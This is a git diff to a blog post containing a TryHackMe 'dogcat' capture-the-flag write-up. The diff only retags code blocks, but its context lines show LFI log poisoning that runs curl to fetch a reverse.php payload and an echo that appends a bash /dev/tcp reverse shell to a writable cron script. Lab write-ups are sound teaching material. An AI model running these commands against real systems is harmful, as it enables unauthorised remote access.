@@ -4,7 +4,7 @@ author : Seif-Allah
 description : "TryHackMe: WriteUp for the 'dogcat' room (Level: Medium)"
 layout : post
 category: CTF-WriteUp
-tags : [THM,TryHackMe,WriteUp,dogcat,Medium,CTF]
+
 image : /assets/images/writeups/thm/dogcat/dogcat.png
 ---
 Link : [dogcat room](https://tryhackme.com/room/dogcat)
@@ -17,7 +17,7 @@ After finishing [lfi basics room](), and learning some new lfi stuff, I chose th
 ### Enumeration
 
 - - -
-```
+```bash
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -59,7 +59,7 @@ I think it's time for some [lfi](https://github.com/seifallahhomrani1/PayloadsAl
 First things first, I used the null byte character : %00
 The result was : 
 - - -
-```
+```bash
 Warning: include(): Failed opening 'dog;ls' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
 ```
 so we get rid of the first warning which means that :
@@ -118,7 +118,7 @@ Like mentioned [here](https://github.com/seifallahhomrani1/PayloadsAllTheThings/
 - - -
 and then started a web server on my local host to host a reverse shell file and used wget command to save it inside a temporary file to finally get a reverse shell ! 
 - - -
-```
+```php
 /?view=./dog/../../../../../../../var/log/apache2/access.log&ext&cmd=curl http://MY-IP:80/reverse.php > /tmp/reverse.php
 ```
 - - -
@@ -158,7 +158,7 @@ tar cf /root/container/backup/backup.tar /root/container
 ```
 From what it looks like, basically it's a cronjob that backup the container, and since it's writeable, let's add a reverse shell, start a listener and wait for it to be executed.
 - - -
-```
+```bash
 echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1'" >> backup.sh
 ```
 - - -
